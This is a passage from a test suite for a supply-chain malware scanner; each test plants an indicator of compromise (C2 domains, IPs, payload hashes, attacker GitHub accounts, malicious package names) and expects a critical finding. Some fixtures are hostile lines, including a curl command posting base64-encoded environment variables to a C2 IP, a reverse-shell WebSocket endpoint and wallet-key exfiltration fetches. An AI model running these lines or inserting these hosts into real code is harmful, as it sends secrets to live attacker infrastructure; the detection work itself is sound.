    it("should detect 87e0bbc636999b.lhr.life Phantom Bot C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'fetch("https://87e0bbc636999b.lhr.life/beacon");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect edcf8b03c84634.lhr.life Phantom Bot C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const u = "https://edcf8b03c84634.lhr.life/cmd";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect 80.200.28.28 Phantom Bot DDoS C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ip.js"),
        'const c2 = "80.200.28.28";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect deadcode09284814 GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const url = "https://github.com/deadcode09284814/loader";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Mini Shai-Hulud TanStack wave additional IOCs (SANS ISC 32994, May 2026)
  // =================================================================

  describe("Mini Shai-Hulud TanStack additional IOCs (May 2026)", () => {
    it("should detect seed1.getsession.org Session exfil node", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'fetch("https://seed1.getsession.org/upload");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect router_init.js payload SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect voicproducoes staging GitHub fork reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const url = "https://github.com/voicproducoes/router";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect zblgg staging GitHub fork reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const url = "https://github.com/zblgg/configuration";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Mini Shai-Hulud @antv / Nx Console / actions-cool wave (May 2026)
  // =================================================================

  describe("Mini Shai-Hulud @antv / Nx Console / actions-cool wave (May 2026)", () => {
    it("should detect t.m-kosche.com shared C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'fetch("https://t.m-kosche.com/api/public/otel/v1/traces", { method: "POST" });'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect @antv index.js Bun payload SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "a68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1c";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect Nx Console malicious VSIX SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hash.js"),
        'const sha = "1a4afce34918bdc74ae3f31edaffffaa0ee074d83618f53edfd88137927340b8";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect kitty/cat.py persistence backdoor reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "persist.sh"),
        'cp payload.py ~/.local/share/kitty/cat.py'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ANTV_WAVE_KITTY_PERSISTENCE"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect firedalazer GitHub Search dead-drop marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "dropper.js"),
        'fetch("https://api.github.com/search/commits?q=firedalazer");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ANTV_WAVE_FIREDALAZER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect OpenTelemetry masquerade C2 pattern", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'await fetch("https://t.m-kosche.com:443/api/public/otel/v1/traces", { body });'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ANTV_WAVE_OTEL_C2"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // postmark-mcp Hostile MCP Server (Sep 2025; re-disclosed May 2026)
  // =================================================================

  describe("postmark-mcp Hostile MCP Server", () => {
    it("should flag postmark-mcp@1.0.16 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "postmark-mcp": "1.0.16" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Megalodon GitHub Actions workflow injection (May 22, 2026)
  // =================================================================

  describe("Megalodon GitHub Workflow Injection (May 2026)", () => {
    it("should detect 216.126.225.129 Megalodon C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ip.js"),
        'const c2 = "216.126.225.129";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect Megalodon C2 endpoint pattern with port", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.sh"),
        'curl -X POST http://216.126.225.129:8443 -d "$(env | base64)"'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MEGALODON_C2_ENDPOINT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // DPRK OtterCookie Node.js stealer (SANS ISC 33006, May 22, 2026)
  // =================================================================

  describe("DPRK OtterCookie Node.js Stealer (May 2026)", () => {
    it("should detect 216.126.225.243 OtterCookie C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ip.js"),
        'const c2 = "216.126.225.243";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect OtterCookie WebSocket reverse shell endpoint", async () => {
      fs.writeFileSync(
        path.join(tempDir, "rev.js"),
        'const ws = new WebSocket("ws://216.126.225.243:8087/api/notify");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "OTTERCOOKIE_C2_ENDPOINT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect hardcoded SuperStr0ngSecret HMAC key", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stealer.js"),
        'const KEY = "SuperStr0ngSecret@)@^";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "OTTERCOOKIE_HMAC_KEY"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect OtterCookie payload SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "049300aa5dd774d6c984779a0570f59610399c71864b5d5c2605906db46ddeb9";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Laravel-Lang DebugElevator PHP credential stealer (May 23, 2026)
  // =================================================================

  describe("Laravel-Lang DebugElevator (May 2026)", () => {
    it("should detect flipboxstudio.info C2 domain", async () => {
      // .php is not in SCANNABLE_EXTENSIONS; use .js to exercise IOC matching
      fs.writeFileSync(
        path.join(tempDir, "helpers.js"),
        'const c2 = "https://flipboxstudio.info/exfil";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect DebugElevator helpers.php SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "f0d912c1a72e533417d5e158bb9755f848ec678b6448ae7c8fb6e87da78a3053";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect DebugElevator variant SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "23e779555c21beaed6ae8f1f298daf9b00d603f1a6716ce329332aadcb80fbe2";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Packagist 8-package GitHub-binary attack (May 23, 2026)
  // =================================================================

  describe("Packagist parikhpreyash4 Binary Attack (May 2026)", () => {
    it("should detect parikhpreyash4 attacker GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "postinstall.js"),
        'const url = "https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/download/v1/gvfsd-network";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // TrapDoor cross-ecosystem credential stealer (May 25, 2026)
  // =================================================================

  describe("TrapDoor Cross-Ecosystem (May 2026)", () => {
    it("should detect ddjidd564.github.io C2 dead-drop domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "fetch.js"),
        'const c2 = "https://ddjidd564.github.io/payload.json";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect ddjidd564 attacker GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const url = "https://github.com/ddjidd564/trapdoor";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Polymarket impersonation typosquat publisher (May 22, 2026)
  // =================================================================

  describe("Polymarket Typosquat (May 2026)", () => {
    it("should detect polymarketbot.polymarketdev.workers.dev exfiltration domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stealer.js"),
        'await fetch("https://polymarketbot.polymarketdev.workers.dev/v1/wallets/keys", { method: "POST" });'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect polymarketdev malicious npm publisher", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const repo = "https://github.com/polymarketdev/polymarket-trader";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Mini Shai-Hulud durabletask PyPI hijack (May 24, 2026)
  // =================================================================

  describe("Mini Shai-Hulud durabletask (May 2026)", () => {
    it("should detect Megalodon throwaway GitHub accounts (rkb8el9r)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "commit.js"),
        'const author = "https://github.com/rkb8el9r";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // ACR Stealer fake Claude page (SANS ISC 33018, May 26, 2026)
  // =================================================================

  describe("ACR Stealer Fake Claude Page (May 2026)", () => {
    it("should detect primemetricsa.com payload-download domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const dl = "https://primemetricsa.com/1518925";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect enhanceblabber.cc C2 via a rotating subdomain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const c2 = "https://yw.enhanceblabber.cc/beacon";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect ACR Stealer component SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "70b5ecc110e074dbca92932c0e840ea3492ea0a43c3f215b71392c12b02213b2";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Malware-Slop npm infostealer (OX Security via THN, May 27, 2026)
  // =================================================================

  describe("Malware-Slop npm (mouse5212-super-formatter, May 2026)", () => {
    it("should match mouse5212-super-formatter against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("mouse5212-super-formatter"),
      );
      expect(matches).toBe(true);
    });

    it("should flag the unplowed3584 attacker GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const repo = "https://github.com/unplowed3584/archive-sync";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // codexui-android npm Codex token stealer (Aikido, May 27, 2026)
  // =================================================================

  describe("codexui-android Codex token stealer (May 2026)", () => {
    it("should detect sentry.anyclaw.store C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const u = "https://sentry.anyclaw.store/startlog";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should match codexui-android against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("codexui-android"),
      );
      expect(matches).toBe(true);
    });

    it("should flag the friuns2 attacker GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const repo = "https://github.com/friuns2/codex-mobile";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // LiteLLM PyPI compromise (TeamPCP, March 24, 2026 / re-disclosed May 22, 2026)
  // =================================================================

  describe("LiteLLM PyPI compromise (TeamPCP, March/May 2026)", () => {
    it("should detect models.litellm.cloud C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const c2 = "https://models.litellm.cloud/upload";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect checkmarx.zone secondary backdoor C2", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poll.js"),
        'const b = "https://checkmarx.zone/stage2";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // vpmdhaj Sicoob/Cloud-Secret cluster (Socket via THN, May 28-29, 2026)
  // =================================================================

  describe("vpmdhaj Sicoob/Cloud-Secret cluster (May 2026)", () => {
    it("should match @vpmdhaj/devops-tools against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("@vpmdhaj/devops-tools"),
      );
      expect(matches).toBe(true);
    });

    it("should match opensearch-security-scanner against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("opensearch-security-scanner"),
      );
      expect(matches).toBe(true);
    });

    it("should flag the Sicoob-Cooperativa attacker GitHub org reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const repo = "https://github.com/Sicoob-Cooperativa/sdk-csharp";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Miasma / @redhat-cloud-services Mini Shai-Hulud variant (June 2026)
  // =================================================================

  describe("Miasma @redhat-cloud-services Mini Shai-Hulud (June 2026)", () => {
    it("should detect the 'Miasma: The Spreading Blight' campaign marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const desc = "Miasma: The Spreading Blight"; createRepo(desc);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MIASMA_SPREADING_BLIGHT_MARKER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // THN Weekly Recap npm/PyPI infostealer cluster (June 8, 2026)
  // =================================================================

  describe("THN Weekly Recap npm/PyPI cluster (June 2026)", () => {
    it("should match turbo-axios against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("turbo-axios"),
      );
      expect(matches).toBe(true);
    });

    it("should match faster-axios against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("faster-axios"),
      );
      expect(matches).toBe(true);
    });

    it("should match cms-store-ren against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("cms-store-ren"),
      );
      expect(matches).toBe(true);
    });

    it("should match the parsimonius typosquat against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("parsimonius"),
      );
      expect(matches).toBe(true);
    });
  });

  // =================================================================
  // ThreatsDay Bulletin npm cluster (The Hacker News, June 11, 2026)
  // =================================================================

  describe("ThreatsDay Bulletin npm cluster (June 2026)", () => {
    it("should match tw-style-utils against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("tw-style-utils"),
      );
      expect(matches).toBe(true);
    });

    it("should match ambar-src against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("ambar-src"),
      );
      expect(matches).toBe(true);
    });

    it("should flag the star45674 SStar Agent lure GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const repo = "https://github.com/star45674/smart-contract-engineer-role";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag the antoniocastaldo1998 malicious-APK GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "dropper.js"),
        'const apk = "https://github.com/antoniocastaldo1998/app-scuola/releases/download/v1/app.apk";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Arch Linux AUR mass hijack npm dropper (June 12, 2026)
  // =================================================================

  describe("Arch Linux AUR Mass Hijack (June 2026)", () => {
    it("should match atomic-lockfile against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("atomic-lockfile"),
      );
      expect(matches).toBe(true);
    });
  });

  // =================================================================
  // Mastra npm scope takeover / Sapphire Sleet (BlueNoroff, DPRK) (June 17, 2026)
  // =================================================================

  describe("Mastra npm Scope Takeover (Sapphire Sleet, June 2026)", () => {
    it("should match easy-day-js against the malicious-name patterns", () => {
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("easy-day-js"),
      );
      expect(matches).toBe(true);
    });

    it("should flag the ehindero compromised maintainer GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const repo = "https://github.com/ehindero/mastra";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag the easy-day-js dropper C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "dropper.js"),
        'const c2 = "http://23.254.164.92:8000/update/49890878";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // NastyC2 npm framework (THN ThreatsDay Bulletin, June 18, 2026)
  // =================================================================

  describe("NastyC2 npm Framework (June 2026)", () => {
    it("should match the NastyC2 package names against the malicious-name patterns", () => {
      for (const name of ["node-ci-utils", "win-env-setup", "macos-ci-utils"]) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });
  });

  // =================================================================
  // PostCSS Tools Windows RAT npm campaign (The Hacker News, June 23, 2026)
  // =================================================================

  describe("PostCSS Tools Windows RAT (June 2026)", () => {
    it("should match the PostCSS-impersonation package names against the malicious-name patterns", () => {
      for (const name of ["postcss-min", "aes-decode-runner-pro"]) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });
  });

  // =================================================================
  // Miasma LeoPlatform / GitHub Actions wave (The Hacker News, June 26, 2026)
  // =================================================================

  describe("Miasma LeoPlatform wave (June 2026)", () => {
    it("should flag leo-sdk@6.0.19 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "leo-sdk": "6.0.19" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag serverless-leo@3.0.14 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "serverless-leo": "3.0.14" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag a clean upstream version of leo-sdk", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "leo-sdk": "6.0.18" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeUndefined();
    });

    it("should detect the RevokeAndItGoesKaboom token-relay marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "relay.js"),
        'const marker = "RevokeAndItGoesKaboom"; relay(marker);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MIASMA_LEO_REVOKE_KABOOM"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag the czirker compromised maintainer GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ref.js"),
        'const repo = "https://github.com/czirker/leo-sdk";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Contagious Interview "Fake Font" npm + Go wave / InvisibleFerret
  // (The Hacker News, June 29, 2026)
  // =================================================================

  describe("Contagious Interview Fake Font (June 2026)", () => {
    it("should match the attacker-uploaded npm package names against the malicious-name patterns", () => {
      for (const name of ["html-to-gutenberg", "fetch-page-assets"]) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });

    it("should match the malicious Go module paths against the malicious-name patterns", () => {
      for (const mod of [
        "github.com/lambda-platform/lambda",
        "github.com/lambda-platform/ebarimt-rest-api",
        "github.com/lambda-platform/dan",
        "github.com/reauheau/goaubio",
        "github.com/glacialspring/go-winsparkle",
        "github.com/glacialspring/static",
        "github.com/bm-197/chill",
        "github.com/naol7/dist-task-scheduler",
        "github.com/dexbotsdev/uniswap-v2-v3-arbitrage",
        "github.com/rickt/slack-weather-bot",
        "github.com/Barsu5489/commerce",
        "github.com/Setsu548/Logistic",
      ]) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(mod),
        );
        expect(matches).toBe(true);
      }
    });

    it("should NOT turn the disguised FontAwesome web-font path into a signature", () => {
      // fa-solid-400.woff2 is the payload-carrying filename but also a real FontAwesome
      // asset; ensure we did not add it as a malicious-name pattern (false-positive guard).
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test("public/fonts/fa-solid-400.woff2"),
      );
      expect(matches).toBe(false);
    });
  });

  // =================================================================
  // Contagious Interview Rollup polyfill npm packages (Lazarus, DPRK)
  // (The Hacker News / JFrog, July 3, 2026)
  // =================================================================

  describe("Contagious Interview Rollup Polyfill (July 2026)", () => {
    it("should match the attacker-uploaded Rollup-polyfill npm package names against the malicious-name patterns", () => {
      for (const name of [
        "rollup-packages-polyfill-core",
        "rollup-runtime-polyfill-core",
        "rollup-plugin-polyfill-connect",
        "quirky-token",
        "react-icon-svgs",
        "swift-parse-stream",
      ]) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });

    it("should detect the 216.126.236.244 C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "config.js"),
        'const c2 = "216.126.236.244";'
      );

      const report = await scan({ target: tempDir, format: "text" });
